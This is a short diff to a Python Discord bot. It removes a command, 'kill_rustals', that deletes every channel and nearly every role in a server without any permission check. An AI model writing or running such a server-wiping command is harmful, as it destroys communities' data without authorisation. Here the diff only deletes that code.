@@ -36,25 +36,6 @@ async def change_status():
 
 
 @client.command(pass_context=True)
-async def kill_rustals(ctx):
-    for channel in ctx.message.guild.channels:
-        if channel == "Text Channels":
-            continue
-        elif channel == "Voice Channels":
-            continue
-        await channel.delete()
-        print(str(channel) + " Deleted!")
-    index = 0
-    for role in ctx.message.guild.roles:
-        if index == 0:
-            index += 1
-            continue
-        print(str(role) + " Deleted!")
-        await role.delete()
-        index += 1
-
-
-@client.command(pass_context=True)
 async def leave(ctx):
     for x in client.voice_clients:
         if x.channel == ctx.author.voice.channel:
